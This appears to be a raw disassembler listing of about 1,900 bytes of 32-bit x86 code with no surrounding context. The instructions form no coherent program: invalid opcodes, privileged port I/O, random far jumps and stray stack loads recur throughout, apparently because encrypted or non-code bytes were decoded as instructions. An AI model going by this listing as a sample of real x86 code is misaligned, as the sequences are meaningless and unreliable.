  40a130:	in     eax,0xd3
  40a132:	xor    ecx,DWORD PTR [ecx+eiz*1+0x6a]
  40a136:	jmp    0xd746:0x618cd2a4
  40a13d:	sbb    al,BYTE PTR [ebx-0x1ca013a7]
  40a143:	std    
  40a144:	lods   al,BYTE PTR ds:[esi]
  40a145:	cdq    
  40a146:	mov    bl,0x8b
  40a148:	mov    ch,0x8f
  40a14a:	cmc    
  40a14b:	or     edx,ecx
  40a14d:	dec    ebx
  40a14e:	arpl   WORD PTR [ebp-0x10],dx
  40a151:	cli    
  40a152:	sbb    eax,0x6fe19b4b
  40a157:	sub    BYTE PTR [esi],ch
  40a159:	bound  ebx,QWORD PTR [eax-0x38]
  40a15c:	repnz inc ecx
  40a15e:	cli    
  40a15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a160:	or     ebp,DWORD PTR [eax-0x37]
  40a163:	cs jl  0x40a19c
  40a166:	mov    al,0x4d
  40a168:	cli    
  40a169:	outs   dx,DWORD PTR ds:[esi]
  40a16a:	fisttp QWORD PTR [edx]
  40a16c:	scas   al,BYTE PTR es:[edi]
  40a16d:	mov    esi,?
  40a16f:	pop    esp
  40a170:	mov    ebx,DWORD PTR [ecx]
  40a172:	dec    ecx
  40a173:	push   ecx
  40a174:	xchg   DWORD PTR [ebx-0x31d17346],ecx
  40a17a:	not    DWORD PTR [edx-0x6f]
  40a17d:	mov    eax,ds:0x5d0ec4c
  40a182:	sub    cl,BYTE PTR [eax]
  40a184:	mov    edx,0x544b0df4
  40a189:	push   cs
  40a18a:	mov    dh,0xa5
  40a18c:	and    BYTE PTR [esi-0x44e2df2b],al
  40a192:	or     al,0x3
  40a194:	(bad)  
  40a195:	neg    BYTE PTR [ebx]
  40a197:	xor    eax,0x7d5b33d7
  40a19c:	mov    cl,0xe8
  40a19e:	test   eax,0xa0819547
  40a1a3:	leave  
  40a1a4:	pop    edx
  40a1a5:	mov    esp,0xe7c38584
  40a1aa:	pop    ebp
  40a1ab:	mov    dh,0x79
  40a1ad:	mov    ah,0xa2
  40a1af:	loop   0x40a21d
  40a1b1:	(bad)  
  40a1b2:	out    0x8e,al
  40a1b4:	or     BYTE PTR [eax+0x143ac67f],bl
  40a1ba:	inc    ebx
  40a1bb:	nop
  40a1bc:	fwait
  40a1bd:	int    0xc9
  40a1bf:	stc    
  40a1c0:	xchg   edx,eax
  40a1c1:	ss dec edx
  40a1c3:	outs   dx,BYTE PTR ds:[esi]
  40a1c4:	add    al,0x4c
  40a1c6:	dec    ecx
  40a1c7:	push   ebp
  40a1c8:	dec    edi
  40a1c9:	shr    dh,cl
  40a1cb:	pop    edx
  40a1cc:	enter  0x8b68,0x3
  40a1d0:	enter  0xb55e,0x12
  40a1d4:	pop    edi
  40a1d5:	pop    edx
  40a1d6:	js     0x40a177
  40a1d8:	shr    BYTE PTR [ebx+0x58],cl
  40a1db:	repz push ebp
  40a1dd:	or     edi,ebx
  40a1df:	pop    ebp
  40a1e0:	popa   
  40a1e1:	repnz dec ebx
  40a1e3:	adc    edi,esp
  40a1e5:	or     al,0xe9
  40a1e7:	pop    ss
  40a1e8:	xor    ecx,ebp
  40a1ea:	test   DWORD PTR [ebx+0x5a9ecd90],eax
  40a1f0:	add    eax,0x5d85fd1a
  40a1f5:	jmp    0x1190:0xdba0f493
  40a1fc:	sub    eax,0x537c60fa
  40a201:	stos   DWORD PTR es:[edi],eax
  40a202:	xor    DWORD PTR ss:0x73547902,0xff062543
  40a20d:	mov    al,ds:0xb5dc0f75
  40a212:	push   cs
  40a213:	add    al,0x9
  40a215:	or     BYTE PTR [edx-0x389cf4df],dh
  40a21b:	mov    DWORD PTR [ecx-0x6d],edx
  40a21e:	loope  0x40a1de
  40a220:	jmp    0x40a28e
  40a222:	pop    edi
  40a223:	fild   DWORD PTR [edi-0x3d47513a]
  40a229:	sub    al,0x8f
  40a22b:	imul   edi,DWORD PTR ss:[ebx+0x6b],0xfffffff9
  40a230:	sub    al,0x6
  40a232:	jmp    0xb9245afc
  40a237:	ror    DWORD PTR [edi+0x2c],1
  40a23a:	ins    DWORD PTR es:[edi],dx
  40a23b:	inc    edi
  40a23c:	mov    edx,0xbddd4bfd
  40a241:	inc    ebx
  40a242:	and    eax,0x973a854
  40a247:	xchg   edi,eax
  40a248:	jb     0x40a1f8
  40a24a:	dec    ebx
  40a24b:	mov    eax,ds:0xac5a6f25
  40a250:	ins    DWORD PTR es:[edi],dx
  40a251:	push   esi
  40a252:	fucomi st,st(5)
  40a254:	push   edx
  40a255:	adc    eax,0xe9aa2e2a
  40a25a:	inc    edx
  40a25b:	mov    ebx,0x1ad57d91
  40a260:	jl     0x40a1e4
  40a262:	cmc    
  40a263:	scas   al,BYTE PTR es:[edi]
  40a264:	arpl   WORD PTR [eax],si
  40a266:	cmp    eax,0xc8442992
  40a26b:	mov    esp,0xca26c87c
  40a270:	push   edi
  40a271:	pushf  
  40a272:	sbb    DWORD PTR [edi-0x61],ebp
  40a275:	mov    WORD PTR [esi+0x55],es
  40a278:	les    eax,FWORD PTR [ebx+0x30]
  40a27b:	sbb    edi,DWORD PTR [ecx-0xd3b0791]
  40a281:	stos   DWORD PTR es:[edi],eax
  40a282:	jg     0x40a289
  40a284:	mov    ds:0x4c98e9a2,eax
  40a289:	nop
  40a28a:	out    dx,al
  40a28b:	call   0x8e3c:0xf730a537
  40a292:	imul   esi,DWORD PTR [esi+0x7d],0xe36f850c
  40a299:	xor    DWORD PTR [edi],esp
  40a29b:	call   0x3d73:0x72b20362
  40a2a2:	clc    
  40a2a3:	fs push 0x1376b093
  40a2a9:	bound  esp,QWORD PTR [ecx+0x6c]
  40a2ac:	jno    0x40a2c1
  40a2ae:	shr    DWORD PTR [eax-0xe6fe4a1],1
  40a2b4:	push   ebp
  40a2b5:	jmp    0x7b3eb5e3
  40a2ba:	add    al,BYTE PTR [eax-0x58]
  40a2bd:	mov    DWORD PTR [ecx+ecx*1-0x3f36314f],ebp
  40a2c4:	mov    eax,0xe224c434
  40a2c9:	in     eax,dx
  40a2ca:	sbb    BYTE PTR [esp+edx*8+0x3dcb1280],dl
  40a2d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2d2:	push   ds
  40a2d3:	dec    ebx
  40a2d4:	in     eax,dx
  40a2d5:	jbe    0x40a291
  40a2d7:	and    al,0x9f
  40a2d9:	mov    ?,WORD PTR [eax]
  40a2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2dc:	mov    ah,0xeb
  40a2de:	or     dl,bh
  40a2e0:	mov    ecx,0xf4dd1e5a
  40a2e5:	lahf   
  40a2e6:	jge    0x40a26b
  40a2e8:	(bad)  
  40a2e9:	call   0x2531:0x86aad36c
  40a2f0:	dec    ebx
  40a2f1:	adc    eax,0x62349dfe
  40a2f6:	fs push 0xffffffd8
  40a2f9:	(bad)
  40a2fc:	(bad)  
  40a2fd:	test   BYTE PTR [edi-0x36da64b6],0x57
  40a304:	mov    BYTE PTR [edi+0x5566fd3a],dl
  40a30a:	sub    edi,DWORD PTR [esi+0x9c506fb]
  40a310:	ins    BYTE PTR es:[edi],dx
  40a311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a312:	fcmovbe st,st(5)
  40a314:	xchg   edx,eax
  40a315:	adc    al,0x24
  40a317:	nop
  40a318:	xchg   edi,eax
  40a319:	inc    esi
  40a31a:	xchg   BYTE PTR [ebp-0x7365c53e],cl
  40a320:	mov    ecx,0x46cd8e30
  40a325:	fimul  DWORD PTR [eax]
  40a327:	or     BYTE PTR [esi+0x41405783],bl
  40a32d:	xchg   BYTE PTR [edx-0x983c93c],bl
  40a333:	lea    eax,[esp+edi*8-0x4c984251]
  40a33a:	push   ecx
  40a33b:	cmp    ah,BYTE PTR [ebx-0x4b]
  40a33e:	sbb    eax,0xeb99eec9
  40a343:	inc    ebp
  40a344:	inc    edx
  40a345:	fldenv [ecx-0x7]
  40a348:	test   al,0x45
  40a34a:	pusha  
  40a34b:	fdivr  DWORD PTR [esi+0x4bfd1618]
  40a351:	scas   eax,DWORD PTR es:[edi]
  40a352:	mov    eax,0xf44e7dc0
  40a357:	aaa    
  40a358:	ins    BYTE PTR es:[edi],dx
  40a359:	fisttp DWORD PTR [ebp-0x605c11a6]
  40a35f:	rcr    BYTE PTR [ebx+0x20],0x25
  40a363:	and    DWORD PTR [edx],edi
  40a365:	cmp    al,0xfa
  40a367:	ins    BYTE PTR es:[edi],dx
  40a368:	(bad)  
  40a369:	dec    edx
  40a36a:	jmp    0xc0d8:0xd59b4636
  40a371:	pop    edi
  40a372:	or     BYTE PTR [eax-0x7b],ch
  40a375:	xor    bh,bl
  40a377:	std    
  40a378:	jmp    0x44d2:0xd63684db
  40a37f:	xor    bl,BYTE PTR [edx]
  40a381:	fdecstp 
  40a383:	dec    esp
  40a384:	in     eax,dx
  40a385:	sbb    dh,ch
  40a387:	call   FWORD PTR [ebp+0x3638d975]
  40a38d:	popf   
  40a38e:	leave  
  40a38f:	(bad)  
  40a390:	ss retf 
  40a392:	push   ebx
  40a393:	aad    0x9
  40a395:	sbb    ebx,ebx
  40a397:	mov    ds:0x69c73047,al
  40a39c:	je     0x40a41b
  40a39e:	and    eax,0xe6ffa6c9
  40a3a3:	mov    ds,WORD PTR [ecx]
  40a3a5:	jmp    0x24af:0xf1a1f56e
  40a3ac:	jl     0x40a398
  40a3ae:	cld    
  40a3af:	mov    ds:0xcc104580,eax
  40a3b4:	mov    WORD PTR [edx+edx*4],es
  40a3b7:	jne    0x40a37e
  40a3b9:	push   ds
  40a3ba:	adc    eax,0x389b7e52
  40a3bf:	and    ah,BYTE PTR [esi-0x29]
  40a3c2:	mov    cl,0xc3
  40a3c4:	(bad)  
  40a3c5:	fimul  WORD PTR [ebx+edi*4-0x63]
  40a3c9:	mov    bh,0xf6
  40a3cb:	test   DWORD PTR [eax],edx
  40a3cd:	cmp    bh,BYTE PTR [esp+ebp*4+0x6]
  40a3d1:	aam    0x5f
  40a3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3d4:	in     eax,0x4b
  40a3d6:	jb     0x40a42f
  40a3d8:	int3   
  40a3d9:	push   esp
  40a3da:	lods   al,BYTE PTR ds:[esi]
  40a3db:	hlt    
  40a3dc:	inc    edx
  40a3dd:	adc    al,dh
  40a3df:	mov    al,0x8c
  40a3e1:	adc    BYTE PTR cs:[edi-0x56],dh
  40a3e5:	mov    ds:0x5eeb1de6,eax
  40a3ea:	daa    
  40a3eb:	mov    ch,0x60
  40a3ed:	inc    edi
  40a3ee:	push   ds
  40a3ef:	sbb    al,0x1c
  40a3f1:	loopne 0x40a390
  40a3f3:	js     0x40a473
  40a3f5:	scas   al,BYTE PTR es:[edi]
  40a3f6:	mov    al,ds:0x3065486b
  40a3fb:	xor    al,0x3f
  40a3fd:	mov    eax,ds:0x9b42b35d
  40a402:	test   eax,0xb17d71b7
  40a407:	je     0x40a3e9
  40a409:	xchg   BYTE PTR [eax],bh
  40a40b:	in     eax,0x29
  40a40d:	adc    cl,ah
  40a40f:	outs   dx,BYTE PTR ds:[esi]
  40a410:	push   esp
  40a411:	dec    ebp
  40a412:	nop
  40a413:	das    
  40a414:	and    BYTE PTR [eax+0xca3fcab],ch
  40a41a:	jmp    0x88a5:0x7b744e38
  40a421:	ret    
  40a422:	mov    ebp,0xb82a4691
  40a427:	mov    al,0x9b
  40a429:	adc    ch,cl
  40a42b:	add    dl,0xa
  40a42e:	mov    ebx,0xc75c013
  40a433:	xchg   BYTE PTR [ecx+0x5b],dh
  40a436:	mov    al,0xc2
  40a438:	cli    
  40a439:	xchg   edx,eax
  40a43a:	inc    edx
  40a43b:	adc    dh,BYTE PTR [edx-0x2dc18c65]
  40a441:	out    dx,eax
  40a442:	in     eax,dx
  40a443:	test   eax,0xe7c568f6
  40a448:	lods   eax,DWORD PTR ds:[esi]
  40a449:	cmp    DWORD PTR ds:0x8ee39181,esp
  40a44f:	fstp   TBYTE PTR [eax+0x71]
  40a452:	pop    edi
  40a453:	jle    0x40a424
  40a455:	into   
  40a456:	dec    ebp
  40a457:	std    
  40a458:	rcr    DWORD PTR es:[ecx],1
  40a45b:	lods   eax,DWORD PTR ds:[esi]
  40a45c:	pop    edi
  40a45d:	popf   
  40a45e:	jl     0x40a443
  40a460:	pop    esi
  40a461:	jae    0x40a466
  40a463:	dec    edi
  40a464:	out    0x79,al
  40a466:	lods   eax,DWORD PTR ds:[esi]
  40a467:	jnp    0x40a460
  40a469:	gs mov ax,0xd13c
  40a46e:	mov    bh,0x3
  40a470:	or     edi,0x5c1d710e
  40a476:	xor    BYTE PTR [ebx],dl
  40a478:	xchg   ebx,eax
  40a479:	push   cs
  40a47a:	mov    ebp,0x7df841d8
  40a47f:	or     DWORD PTR [ecx+ebp*8-0x294becf6],ebx
  40a486:	scas   eax,DWORD PTR es:[edi]
  40a487:	mov    al,0x5c
  40a489:	gs mov bh,0x5
  40a48c:	(bad)  
  40a48d:	iret   
  40a48e:	jbe    0x40a482
  40a490:	sar    DWORD PTR [ebx],0xdc
  40a493:	jge    0x40a485
  40a495:	push   ebp
  40a496:	out    dx,eax
  40a497:	je     0x40a4fb
  40a499:	std    
  40a49a:	mov    cl,0xed
  40a49c:	jo     0x40a453
  40a49e:	call   0x13e3:0xa044
  40a4a4:	dec    eax
  40a4a5:	mov    ebx,0x9dd1adbc
  40a4aa:	(bad)  
  40a4ab:	pusha  
  40a4ac:	and    DWORD PTR [esi],esi
  40a4ae:	and    edx,0x71
  40a4b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4b2:	in     al,dx
  40a4b3:	clc    
  40a4b4:	ror    DWORD PTR [ebx-0x5e02ccc4],1
  40a4ba:	arpl   ax,ax
  40a4bc:	xchg   edx,eax
  40a4bd:	in     al,0x2b
  40a4bf:	pop    ecx
  40a4c0:	xor    al,BYTE PTR [eax+0x15]
  40a4c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c4:	jb     0x40a4be
  40a4c6:	fld    st(7)
  40a4c8:	and    BYTE PTR [ebp-0x17],0x63
  40a4cc:	es dec edx
  40a4ce:	into   
  40a4cf:	in     eax,0x2a
  40a4d1:	bound  esp,QWORD PTR [ebx]
  40a4d3:	(bad)  
  40a4d4:	in     al,dx
  40a4d5:	jb     0x40a4bd
  40a4d7:	pop    edi
  40a4d8:	xchg   ebp,eax
  40a4d9:	popa   
  40a4da:	aad    0x89
  40a4dc:	mov    ah,0xc
  40a4de:	pusha  
  40a4df:	or     al,0xd5
  40a4e1:	pop    edi
  40a4e2:	sub    BYTE PTR [eax],ch
  40a4e4:	pop    eax
  40a4e5:	adc    BYTE PTR [ebp+0x47],dh
  40a4e8:	test   BYTE PTR [eax-0x521eb676],dh
  40a4ee:	fdivr  DWORD PTR [ebx]
  40a4f0:	xchg   ebx,eax
  40a4f1:	mov    ds:0x17f9b300,al
  40a4f6:	sahf   
  40a4f7:	push   DWORD PTR [ecx+0x76eb7473]
  40a4fd:	std    
  40a4fe:	rcl    DWORD PTR [eax+0x45ef8556],cl
  40a504:	(bad)  
  40a505:	pop    ebp
  40a506:	mov    dh,0x92
  40a508:	sub    DWORD PTR [edx-0x48],0xffffffc6
  40a50c:	adc    al,0xb1
  40a50e:	xlat   BYTE PTR ds:[ebx]
  40a50f:	add    sp,WORD PTR [edx+esi*2]
  40a513:	ret    
  40a514:	jne    0x40a595
  40a516:	inc    edx
  40a517:	sahf   
  40a518:	xlat   BYTE PTR ds:[ebx]
  40a519:	xchg   ebx,eax
  40a51a:	xchg   DWORD PTR cs:[ebp-0x4a24650d],edi
  40a521:	push   esp
  40a522:	mov    cl,0xe6
  40a524:	adc    eax,0xa75dc266
  40a529:	rol    DWORD PTR [ebp+ebp*4-0x5e429df1],0x4c
  40a531:	hlt    
  40a532:	lods   eax,DWORD PTR ds:[esi]
  40a533:	cld    
  40a534:	out    dx,al
  40a535:	add    eax,0x5440b5ab
  40a53a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a53b:	jb     0x40a4d8
  40a53d:	xchg   esp,eax
  40a53e:	xor    esp,DWORD PTR [edi]
  40a540:	pop    ss
  40a541:	enter  0x14d1,0x1c
  40a545:	out    dx,al
  40a546:	sub    DWORD PTR [eax],eax
  40a548:	dec    eax
  40a549:	xor    ah,dl
  40a54b:	inc    esi
  40a54c:	out    0xf1,al
  40a54e:	pop    esi
  40a54f:	xchg   ecx,eax
  40a550:	xor    cl,BYTE PTR ds:0xc7b8d5a5
  40a556:	jp     0x40a52d
  40a558:	les    edx,FWORD PTR [edi]
  40a55a:	stos   BYTE PTR es:[edi],al
  40a55b:	inc    ecx
  40a55c:	(bad)  
  40a55d:	fist   DWORD PTR ds:0xb2b87009
  40a563:	push   ebp
  40a564:	sbb    DWORD PTR [ecx+0x45],edi
  40a567:	repz in al,0xe9
  40a56a:	lds    edx,FWORD PTR [esi+0x46]
  40a56d:	sbb    al,0x6a
  40a56f:	jae    0x40a5d4
  40a571:	sub    eax,0x1f639a65
  40a576:	adc    esi,DWORD PTR [esi+0x34]
  40a579:	adc    edi,edi
  40a57b:	jo     0x40a5f2
  40a57d:	xor    BYTE PTR [ecx-0x42ebea37],dl
  40a583:	iret   
  40a584:	mov    edi,0xfacfaf1
  40a589:	clc    
  40a58a:	mov    esp,0xd43d5c60
  40a58f:	pop    esp
  40a590:	mov    es,ebx
  40a592:	push   ebp
  40a593:	mov    BYTE PTR [ebp+ebp*1+0x339a1694],ch
  40a59a:	arpl   WORD PTR [ebp+0x2756c3d6],dx
  40a5a0:	outs   dx,BYTE PTR ds:[esi]
  40a5a1:	mov    dl,0x89
  40a5a3:	mov    BYTE PTR [ebp+0x2aa869d5],dh
  40a5a9:	dec    eax
  40a5aa:	mov    ds,edx
  40a5ac:	cmp    eax,0x2d2bb44d
  40a5b1:	or     BYTE PTR [edi-0x10c54d33],dl
  40a5b7:	sub    BYTE PTR [ecx-0x1d],al
  40a5ba:	pop    ss
  40a5bb:	jecxz  0x40a608
  40a5bd:	jecxz  0x40a62d
  40a5bf:	push   ecx
  40a5c0:	adc    BYTE PTR [ecx],0x43
  40a5c3:	mov    edi,0xfaf36c87
  40a5c8:	rcl    BYTE PTR [edx-0x65],cl
  40a5cb:	mov    fs,WORD PTR [ebx+esi*1-0x42]
  40a5cf:	rcl    BYTE PTR [ecx],0x69
  40a5d2:	out    dx,eax
  40a5d3:	jmp    0xe775:0x97900d94
  40a5da:	push   ecx
  40a5db:	push   ds
  40a5dc:	and    al,0xd1
  40a5de:	xchg   edi,eax
  40a5df:	fs mov edi,0xf3618a3e
  40a5e5:	fwait
  40a5e6:	and    DWORD PTR [ecx+0x65f28f02],esi
  40a5ec:	sbb    al,0x88
  40a5ee:	leave  
  40a5ef:	enter  0x6c76,0xe7
  40a5f3:	aad    0xab
  40a5f5:	push   edx
  40a5f6:	stos   DWORD PTR es:[edi],eax
  40a5f7:	ss jo  0x40a5d2
  40a5fa:	scas   eax,DWORD PTR es:[edi]
  40a5fb:	ja     0x40a582
  40a5fd:	sbb    bh,BYTE PTR [edx+0x38735ede]
  40a603:	mov    edx,0xdbb7614b
  40a608:	mul    DWORD PTR [edx]
  40a60a:	in     al,dx
  40a60b:	push   ds
  40a60c:	cmp    DWORD PTR [esi-0x49],edx
  40a60f:	mov    esp,0x7b05e654
  40a614:	pushf  
  40a615:	neg    BYTE PTR gs:[ebp-0x39]
  40a619:	je     0x40a5ec
  40a61b:	jmp    0x40a675
  40a61d:	adc    bh,BYTE PTR [ebx+0x27]
  40a620:	mov    eax,DWORD PTR [ebx+edx*4+0x15e29c0a]
  40a627:	or     bh,ah
  40a629:	inc    ebp
  40a62a:	cmc    
  40a62b:	or     BYTE PTR [ebp-0x39],ah
  40a62e:	push   esi
  40a62f:	in     al,dx
  40a630:	daa    
  40a631:	bound  ebx,QWORD PTR [edx-0x7c]
  40a634:	xchg   ebx,ecx
  40a636:	xchg   esi,eax
  40a637:	add    ebp,DWORD PTR [eax-0x69]
  40a63a:	fstp   TBYTE PTR [ebp+0x77c94ce3]
  40a640:	push   esp
  40a641:	adc    al,0x68
  40a643:	jmp    0x272c549e
  40a648:	mov    esi,0x1a81373a
  40a64d:	sbb    dh,BYTE PTR [edx]
  40a64f:	outs   dx,DWORD PTR ds:[esi]
  40a650:	jmp    0x73b89a0b
  40a655:	lods   eax,DWORD PTR ds:[esi]
  40a656:	xchg   bl,bl
  40a658:	sub    esi,DWORD PTR [edx]
  40a65a:	nop
  40a65b:	int    0x98
  40a65d:	add    DWORD PTR [ecx+0x50],eax
  40a660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a661:	(bad)  
  40a662:	jmp    0x40a648
  40a664:	jbe    0x40a5e9
  40a666:	or     DWORD PTR ds:0x164fc122,0x56
  40a66d:	cs call 0x66f988e4
  40a673:	retf   0xd3be
  40a676:	pop    DWORD PTR [eax]
  40a678:	aad    0x8a
  40a67a:	arpl   WORD PTR [ebx-0x1cd52d32],bx
  40a680:	mov    esp,0x2505f743
  40a685:	cmp    al,bl
  40a687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a688:	and    DWORD PTR [edi],ebx
  40a68a:	ja     0x40a625
  40a68c:	dec    eax
  40a68d:	js     0x40a62d
  40a68f:	pusha  
  40a690:	sbb    cl,BYTE PTR [ebp+0x78]
  40a693:	leave  
  40a694:	fiadd  WORD PTR [ebx-0x5bb945a5]
  40a69a:	dec    esp
  40a69b:	mov    BYTE PTR [ecx-0x126fa326],ch
  40a6a1:	cmc    
  40a6a2:	out    dx,eax
  40a6a3:	leave  
  40a6a4:	mov    dh,ch
  40a6a6:	lods   eax,DWORD PTR ds:[esi]
  40a6a7:	push   ecx
  40a6a8:	inc    ecx
  40a6a9:	mov    eax,0xd72a4748
  40a6ae:	mov    ds:0x406655bc,al
  40a6b3:	imul   ebp
  40a6b5:	pop    esi
  40a6b6:	gs aam 0x38
  40a6b9:	retf   0xd600
  40a6bc:	mov    bh,0xb0
  40a6be:	mov    edi,0x567d15f7
  40a6c3:	bound  edi,QWORD PTR [ecx-0xfb72d53]
  40a6c9:	inc    ebx
  40a6ca:	mov    ds:0xa949e388,al
  40a6cf:	jge    0x40a654
  40a6d1:	ins    DWORD PTR es:[edi],dx
  40a6d2:	xor    bh,BYTE PTR [ebp+0x18591810]
  40a6d8:	xchg   esi,eax
  40a6d9:	pop    ds
  40a6da:	lods   eax,DWORD PTR ds:[esi]
  40a6db:	mov    ds,ebp
  40a6dd:	or     esi,DWORD PTR [edi-0x3b773919]
  40a6e3:	mov    dh,0x94
  40a6e5:	add    DWORD PTR [ebp-0x43],0x65640f8f
  40a6ec:	(bad)  
  40a6ed:	mov    ds:0xea9c8cda,eax
  40a6f2:	push   ds
  40a6f3:	(bad)  
  40a6f4:	out    dx,eax
  40a6f5:	nop
  40a6f6:	imul   esp,DWORD PTR [esi+ebp*2],0x60075b8
  40a6fd:	push   ebx
  40a6fe:	bound  edi,QWORD PTR [ebx-0x6c]
  40a701:	fdiv   DWORD PTR [edx+0x117ad92b]
  40a707:	test   DWORD PTR [ecx+esi*4-0x68bfc952],ebp
  40a70e:	sbb    edx,DWORD PTR [esi]
  40a710:	xor    DWORD PTR [esi+0x4457543c],ebx
  40a716:	jmp    0x502:0xba88e6e
  40a71d:	(bad)  
  40a71e:	(bad)  
  40a71f:	nop
  40a720:	push   ecx
  40a721:	aaa    
  40a722:	lods   eax,DWORD PTR ds:[esi]
  40a723:	inc    eax
  40a724:	push   es
  40a725:	jmp    0xf31878e3
  40a72a:	sbb    ebx,DWORD PTR [ebx-0x26]
  40a72d:	imul   DWORD PTR [esi-0x56]
  40a730:	dec    edi
  40a731:	cli    
  40a732:	push   esi
  40a733:	in     al,dx
  40a734:	in     eax,dx
  40a735:	pop    ds
  40a736:	push   esi
  40a737:	and    bh,ah
  40a739:	fild   WORD PTR [edi]
  40a73b:	fiadd  DWORD PTR [edx+edx*8+0xb62c4b5]
  40a742:	aas    
  40a743:	fisttp DWORD PTR [ebx+0x4f628486]
  40a749:	into   
  40a74a:	jae    0x40a6f9
  40a74c:	mov    ds:0x3213de54,eax
  40a751:	xor    dh,dl
  40a753:	shl    DWORD PTR [eax+0x1d],cl
  40a756:	nop
  40a757:	rcr    BYTE PTR [ecx+ecx*2],cl
  40a75a:	sti    
  40a75b:	jl     0x40a7a7
  40a75d:	int    0x7c
  40a75f:	mov    ecx,DWORD PTR [ebp-0x658d2ba2]
  40a765:	or     BYTE PTR [edi+0x4e],0xfc
  40a769:	imul   esi,DWORD PTR [esi+0x28b6c41a],0xffffffed
  40a770:	pop    ss
  40a771:	mov    edi,0x16c5f67d
  40a776:	(bad)  
  40a777:	jl     0x40a7e5
  40a779:	je     0x40a7b5
  40a77b:	into   
  40a77c:	loop   0x40a7c4
  40a77e:	sti    
  40a77f:	sub    ebx,esp
  40a781:	mov    edi,0xcff550b
  40a786:	daa    
  40a787:	pop    edi
  40a788:	fs sub bh,0x45
  40a78c:	fmul   DWORD PTR [esi]
  40a78e:	inc    edi
  40a78f:	mov    edi,esi
  40a791:	jo     0x40a7e2
  40a793:	and    BYTE PTR ds:0x7f068b1f,ah
  40a799:	pusha  
  40a79a:	mov    ds:0xf1916770,eax
  40a79f:	inc    esi
  40a7a0:	in     eax,dx
  40a7a1:	mov    ecx,0xe1f790b0
  40a7a6:	dec    esi
  40a7a7:	popf   
  40a7a8:	lods   eax,DWORD PTR ds:[esi]
  40a7a9:	lahf   
  40a7aa:	jl     0x40a7b0
  40a7ac:	in     eax,0xc6
  40a7ae:	ror    BYTE PTR [ecx],0x7b
  40a7b1:	and    BYTE PTR fs:[edi-0x340a454f],0x6
  40a7b9:	lods   eax,DWORD PTR ds:[esi]
  40a7ba:	jo     0x40a80b
  40a7bc:	xchg   ebp,eax
  40a7bd:	aas    
  40a7be:	dec    ecx
  40a7bf:	xchg   ebp,eax
  40a7c0:	xchg   edi,eax
  40a7c1:	and    al,BYTE PTR ds:0xe7c444fc
  40a7c7:	and    DWORD PTR [ebp-0x71],edx
  40a7ca:	pop    ebx
  40a7cb:	mov    al,0x78
  40a7cd:	rcr    DWORD PTR [esi-0x71],1
  40a7d0:	out    0xe3,eax
  40a7d2:	ficom  WORD PTR [ecx-0x3a]
  40a7d5:	icebp  
  40a7d6:	retf   0xe49a
  40a7d9:	xchg   ecx,eax
  40a7da:	cmp    DWORD PTR [ebp-0x6a582aa5],ecx
  40a7e0:	mov    al,ds:0x92b7a373
  40a7e5:	ret    
  40a7e6:	xor    eax,0x5d75d459
  40a7eb:	pop    esp
  40a7ec:	ins    DWORD PTR es:[edi],dx
  40a7ed:	lahf   
  40a7ee:	add    eax,DWORD PTR [ebx-0x1cd51604]
  40a7f4:	pusha  
  40a7f5:	mov    eax,0x89b78daa
  40a7fa:	inc    ebx
  40a7fb:	add    ecx,esp
  40a7fd:	in     eax,dx
  40a7fe:	and    BYTE PTR ds:0xb49d6f3f,dl
  40a804:	jl     0x40a833
  40a806:	push   esi
  40a807:	dec    ebx
  40a808:	or     BYTE PTR [edx],bh
  40a80a:	popa   
  40a80b:	pop    ds
  40a80c:	icebp  
  40a80d:	lods   al,BYTE PTR ds:[esi]
  40a80e:	in     eax,0x55
  40a810:	cmp    eax,0x4144257f
  40a815:	xchg   edi,eax
  40a816:	sub    BYTE PTR [ebp+0x2588d4cc],ch
  40a81c:	cmp    DWORD PTR [ecx+0x26908fb0],edx
  40a822:	rol    DWORD PTR [ebp-0x36],1
  40a825:	ds dec edx
  40a827:	iret   
  40a828:	ds int3 
  40a82a:	sub    al,0x59
  40a82c:	xor    al,0x9f
  40a82e:	push   ds
  40a82f:	stos   DWORD PTR es:[edi],eax
  40a830:	pop    edx
  40a831:	bswap  ebp
  40a833:	push   esi
  40a834:	div    BYTE PTR [ebp+0x5120f5f1]
  40a83a:	imul   eax,DWORD PTR [ebp*1-0x4b2a1607],0x20
  40a842:	mov    al,0x74
  40a844:	imul   edi,DWORD PTR [esi+0x6a],0x71
  40a848:	mov    ecx,edi
  40a84a:	test   BYTE PTR [ebp-0x6a182b70],dh
  40a850:	sub    eax,0x711483c0
  40a855:	and    eax,0x7679340f
  40a85a:	sub    ebp,DWORD PTR [eax]
  40a85c:	push   ebx
  40a85d:	sti    
  40a85e:	shr    BYTE PTR [esi-0x390f421b],cl
  40a864:	dec    ebp
  40a865:	stos   BYTE PTR es:[edi],al
  40a866:	xor    DWORD PTR [edx],ecx
  40a868:	rcr    BYTE PTR [eax+edx*2-0x7f],cl
  40a86c:	jl     0x40a898
  40a86e:	pop    ds
  40a86f:	lea    esi,[edi-0x28]
  40a872:	mov    bh,0x9d
  40a874:	test   eax,0x46252a13
  40a879:	inc    esp
  40a87a:	jecxz  0x40a800
  40a87c:	cmc    
  40a87d:	xlat   BYTE PTR ds:[ebx]
  40a87e:	pop    ds
  40a87f:	inc    ebx
  40a880:	out    0x19,eax
  40a882:	ror    bh,cl
  40a884:	dec    ecx
  40a885:	ds test al,0x21
  40a888:	push   ebx
  40a889:	mov    bl,0x95
  40a88b:	xor    ebx,DWORD PTR [edi]
  40a88d:	arpl   WORD PTR [edi+0xc4a37c],si
  40a893:	push   cs
  40a894:	sbb    DWORD PTR [esi-0x37fbbd77],0xfffffffe
  40a89b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a89c:	iret   
  40a89d:	into   
  40a89e:	mov    edi,0xeb046981
  40a8a3:	add    edx,ebx
  40a8a5:	pop    esp
  40a8a6:	mov    esi,0x67cf6a2e
  40a8ab:	pop    esp
  40a8ac:	psadbw mm0,QWORD PTR [edi+0x76ab1a39]
